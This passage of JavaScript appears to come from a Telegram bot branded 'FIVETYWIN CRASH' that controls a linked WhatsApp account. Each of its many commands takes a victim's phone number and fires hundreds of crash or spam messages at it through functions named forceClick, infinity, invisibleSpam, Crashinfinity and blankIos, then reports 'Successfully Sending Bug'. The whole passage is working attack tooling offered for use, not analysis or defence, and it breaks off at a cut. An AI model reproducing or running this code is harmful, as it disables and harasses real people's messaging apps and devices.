𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/XAnomin (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "t.me/FIVETYWIN" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : FORCLOSE CLIK
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : FORCLOSE CLIK
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await forceClick(sock, target);
      await forceClick(sock, target);
      await forceClick(sock, target);
      await forceClick(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : FORCLOSE CLIK
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/Xixixi (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "t.me/FIVETYWIN" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await infinity(sock, target);
      await infinity(sock, target);
      await infinity(sock, target);
      await infinity(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/XOlOW (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "t.me/FIVETYWIN" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await invisibleSpam(sock, target);
      await invisibleSpam(sock, target);
      await invisibleSpam(sock, target);
      await invisibleSpam(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN GRSN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN GRSN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/XKairos (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "t.me/FIVETYWIN" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await Crashinfinity(sock, target);
      await Crashinfinity(sock, target);
      await Crashinfinity(sock, target);
      await Crashinfinity(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/XRose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "t.me/FIVETYWIN" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/Xkill (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/XShadow (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂  𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/XWaltres (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await blankIos(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/XKuli (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ https://t.me/+qBTUzSM4Hrw4NjE1 </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
